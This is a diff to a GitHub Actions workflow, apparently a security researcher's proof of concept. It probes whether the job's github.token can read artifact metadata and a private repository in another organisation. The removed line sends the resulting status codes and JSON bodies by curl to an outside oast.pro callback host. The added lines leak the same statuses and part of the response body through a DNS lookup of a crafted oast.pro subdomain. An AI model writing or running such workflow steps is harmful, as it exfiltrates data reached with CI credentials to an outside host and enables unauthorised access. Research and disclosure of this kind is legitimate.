@@ -8,7 +8,7 @@ jobs:
   rd:
     runs-on: ubuntu-latest
     steps:
-      - name: cross-repo metadata read probe (beacon)
+      - name: cross-repo metadata read probe (dns exfil)
         env:
           TOKEN: ${{ github.token }}
         run: |
@@ -19,4 +19,6 @@ jobs:
           DR=$(curl -s -o /tmp/d.json -w '%{http_code}' -H "$A" -H "$H" "$B/orgs/tooforg/artifacts/$D/metadata/deployment-records")
           SR=$(curl -s -o /tmp/s.json -w '%{http_code}' -H "$A" -H "$H" "$B/orgs/tooforg/artifacts/$D/metadata/storage-records")
           MR=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/tooforg/invisible-repo")
-          curl -s -G "http://ro4yhyiy8bnjaqqlmuqbahdry1idkibzn.oast.pro/meta" --data-urlencode "d=$DR" --data-urlencode "s=$SR" --data-urlencode "m=$MR" --data-urlencode "db@/tmp/d.json" --data-urlencode "sb@/tmp/s.json" > /dev/null
+          BS=$(tr -dc 'a-zA-Z0-9' < /tmp/d.json | head -c 30)
+          echo "statuses d=$DR s=$SR m=$MR body=$BS"
+          getent hosts "d${DR}s${SR}m${MR}x${BS}.ro4yhyiy8bnjaqqlmuqbrw8cyb8bzcy8j.oast.pro" > /dev/null 2>&1 || true
